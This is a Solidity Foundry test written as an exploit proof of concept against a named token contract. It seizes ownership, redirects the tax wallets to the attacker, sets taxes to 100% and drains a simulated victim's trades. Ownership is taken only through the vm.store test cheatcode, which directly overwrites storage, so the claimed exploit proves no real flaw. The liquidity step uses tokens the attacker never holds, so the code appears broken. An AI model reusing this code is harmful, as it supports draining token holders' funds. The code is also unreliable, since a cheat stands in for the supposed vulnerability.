// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function owner() external view returns (address);
    function setTaxWallets(address dev, address marketing, address charity) external;
    function setBuyTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function setSellTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    address victim; // Fixed: Declared as state variable to persist across functions
    ICoinToken target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICoinToken(TARGET);
        vm.label(TARGET, "CoinToken");
        vm.label(attacker, "Attacker");

        // Inject ETH for attacker
        deal(attacker, 100 ether);

        // Create victim address
        victim = address(0x1337); // Fixed: Assign value to state variable
        vm.label(victim, "Victim");
        deal(victim, 50 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF9881a0Bf01b1ec048506A188B06d48808087657).balanceOf(address(this));
        // Record initial attacker ETH balance
        uint256 initialEthBalance = attacker.balance;

        // Step 1: Take ownership by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify ownership transfer
        require(target.owner() == attacker, "Ownership transfer failed");

        // Step 2: Redirect all tax wallets to attacker
        target.setTaxWallets(attacker, attacker, attacker);

        // Step 3: Set maximum tax rates (25% each category = 100% total)
        target.setBuyTax(25, 25, 25, 25);
        target.setSellTax(25, 25, 25, 25);

        // Step 4: Setup Uniswap trading
        address routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddr);
        address weth = router.WETH();

        // Attacker adds liquidity to enable trading
        IERC20(TARGET).approve(routerAddr, type(uint256).max);
        router.addLiquidityETH{value: 10 ether}(TARGET, 1000 * 1e18, 0, 0, attacker, block.timestamp + 1000);

        // Step 5: Victim buys tokens (triggers buy tax collection)
        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = TARGET;
        vm.prank(victim);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(0, buyPath, victim, block.timestamp + 1000);

        // Step 6: Victim sells tokens (triggers sell tax and ETH distribution to attacker)
        vm.prank(victim);
        IERC20(TARGET).approve(routerAddr, type(uint256).max);
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;
        uint256 victimBalance = IERC20(TARGET).balanceOf(victim);
        vm.prank(victim);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(victimBalance, 0, sellPath, victim, block.timestamp + 1000);

        // Step 7: Verify attacker's ETH balance increased from tax collections
        uint256 finalEthBalance = attacker.balance;
        assertGt(finalEthBalance, initialEthBalance, "Attacker ETH balance should increase from tax collections");
        uint256 finalBalance = IERC20(0xF9881a0Bf01b1ec048506A188B06d48808087657).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
    fallback() external payable {}
}

